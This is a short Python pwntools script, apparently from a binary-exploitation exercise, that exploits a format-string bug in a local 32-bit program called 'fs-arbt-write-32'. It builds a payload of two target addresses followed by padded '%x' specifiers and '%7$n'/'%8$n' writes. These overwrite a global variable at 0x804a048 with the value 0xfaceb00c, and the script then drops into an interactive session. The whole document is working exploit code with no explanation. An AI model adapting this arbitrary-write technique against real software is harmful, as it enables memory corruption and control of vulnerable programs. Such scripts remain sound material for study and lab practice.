#!/usr/bin/env python

from pwn import *

p = process('./fs-arbt-write-32')

print(p.recv())

addr = 0x804a048 #global variable to overwrite

#%7$p is first spot

first = 0xb00c
first -= 8

second = 0xface - 0xb00c

buf = p32(addr) + p32(addr + 2)
buf += "%" + "%05d" % first + "x"
buf += "%7$n"
buf += "%" + "%05d" % second + "x"
buf += "%8$n"

p.sendline(buf)

print(p.recv())
p.interactive()
